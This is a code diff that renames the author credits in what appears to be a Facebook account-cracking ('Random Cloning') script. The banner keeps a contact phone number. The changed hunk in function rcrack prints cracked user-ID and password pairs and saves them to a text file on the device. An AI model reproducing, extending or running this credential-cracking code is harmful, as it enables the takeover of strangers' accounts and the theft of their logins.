@@ -135,8 +135,8 @@ logo=("""
 ███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
 
 \033[1;32m  ╔═══════════════════════════════════════════════════╗
-\033[1;97m  ╠══[Author:=======================> \33[1;38ANONYMOUS U7P4L  \33[1;38m   ║
-\033[1;32m  ╠══[Facebook:=====================> MOHAMMED956      ║ 
+\033[1;97m  ╠══[Author:=======================> \33[1;38Rai Han  \33[1;38m   ║
+\033[1;32m  ╠══[Facebook:=====================> Rai Han      ║ 
 \033[1;97m  ╠══[Whatsapp:=====================> 01765024742     ║
 \033[1;97m  ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
 \033[1;31m  ╠══[VERSION:======================> 4.0.1           ║
@@ -303,8 +303,8 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[MOHAMMED] ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/MOHAMMED.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\033[38;5;46m[RaiHan] ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/RaiHan.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
